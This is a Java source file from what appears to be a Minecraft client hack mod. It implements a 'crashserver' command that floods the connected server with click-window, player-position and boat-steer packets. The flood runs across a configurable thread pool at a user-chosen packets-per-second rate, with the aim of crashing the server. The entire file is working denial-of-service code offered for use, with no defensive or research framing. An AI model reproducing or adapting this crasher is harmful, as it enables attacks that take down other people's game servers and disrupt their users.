package org.novau233.fallingsun.function.funs;

import net.minecraft.client.Minecraft;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.network.play.client.CPacketSteerBoat;
import net.minecraft.util.EnumHand;
import net.minecraft.util.text.TextComponentString;
import org.apache.logging.log4j.LogManager;
import org.novau233.fallingsun.function.Function;

import java.util.concurrent.ForkJoinPool;
import java.util.concurrent.RecursiveAction;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public class FunCrash implements Function {
    private static final String commandHead = "crashserver";
    private final AtomicInteger pps = new AtomicInteger(1000);
    private final AtomicBoolean enabled = new AtomicBoolean(false);
    private final AtomicInteger threads = new AtomicInteger(4);
    private ForkJoinPool executor = new ForkJoinPool();
    private Mode mode = Mode.ISwap;

    @Override
    public void onClientTick() {
        if (this.executor.getParallelism()!=this.threads.get()){
            this.executor = new ForkJoinPool(this.threads.get());
        }
        if(Minecraft.getMinecraft().getConnection() == null && this.enabled.get()){
            LogManager.getLogger().info("Empty connection detected!");
            this.enabled.set(false);
        }
        if (this.enabled.get()){
            ServerCrasherTask task = null;
            switch (this.mode){
                case ISwap:
                    task = new ServerCrasherTask(0,this.pps.get(),()->{
                        if (Minecraft.getMinecraft().getConnection() == null || !this.enabled.get()){
                            return;
                        }
                        ItemStack stack = new ItemStack(Minecraft.getMinecraft().player.getHeldItem(EnumHand.MAIN_HAND).getItem());
                        Minecraft.getMinecraft().getConnection().sendPacket(new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, stack, (short)1));
                    });
                    break;
                case IPos:
                    task = new ServerCrasherTask(0,this.pps.get(),()->{
                        if (Minecraft.getMinecraft().getConnection() == null || !this.enabled.get()){
                            return;
                        }
                        Minecraft.getMinecraft().getConnection().sendPacket(new CPacketPlayer.PositionRotation(20,20,20,2,2,true));
                    });
                    break;
                case IBoat:
                    task = new ServerCrasherTask(0,this.pps.get(),()->{
                        if (Minecraft.getMinecraft().getConnection() == null || !this.enabled.get()){
                            return;
                        }
                        Minecraft.getMinecraft().getConnection().sendPacket(new CPacketSteerBoat(true,false));
                        Minecraft.getMinecraft().getConnection().sendPacket(new CPacketSteerBoat(false,true));
                        Minecraft.getMinecraft().getConnection().sendPacket(new CPacketSteerBoat(false,false));
                    });
                    break;
            }
            this.executor.submit(task).join();
        }
    }

    @Override
    public void onCommandExecute(String[] arg) {
        if (!this.enabled.get()) {
            if (arg.length != 3) {
                Minecraft.getMinecraft().player.sendMessage(new TextComponentString("Error agrs!The right args is : #crashserver <threads> <pps> <ISwap,IBoat,IPos>"));
                return;
            }
            try{
                this.threads.set(Integer.parseInt(arg[0]));
                this.pps.set(Integer.parseInt(arg[1]));
                this.mode = Mode.valueOf(arg[2]);
            }catch (Exception e){
                Minecraft.getMinecraft().player.sendMessage(new TextComponentString("Error agrs!The right args is : #crashserver <threads> <pps>"));
                return;
            }
            this.enabled.set(true);
            Minecraft.getMinecraft().player.sendMessage(new TextComponentString("Server crasher enabled!"));
        } else {
            this.enabled.set(false);
            Minecraft.getMinecraft().player.sendMessage(new TextComponentString("Server crasher disabled!"));
        }
    }

    @Override
    public String getHead() {
        return commandHead;
    }

    private static class ServerCrasherTask extends RecursiveAction {
        private final int start;
        private final int end;
        private final int hold;
        private final Runnable task;

        public ServerCrasherTask(int start, int end, Runnable task) {
            this.task = task;
            this.start = start;
            this.end = end;
            int newHold = Math.abs(end-start) / Runtime.getRuntime().availableProcessors();
            if (newHold <2){
                newHold = 10;
            }
            this.hold = newHold;
        }

        @Override
        protected void compute() {
            if ((this.end - this.start) <= this.hold) {
                for (int i=start;i<end;i++){
                    try{
                        this.task.run();
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }
            } else {
                int middle = (this.end + this.start) / 2;
                ServerCrasherTask task1 = new ServerCrasherTask(this.start, middle,this.task);
                ServerCrasherTask task2 = new ServerCrasherTask(middle + 1, this.end,this.task);
                task1.fork();
                task2.fork();
            }
        }
    }
    public enum Mode{
        ISwap,
        IPos,
        IBoat
    }
}
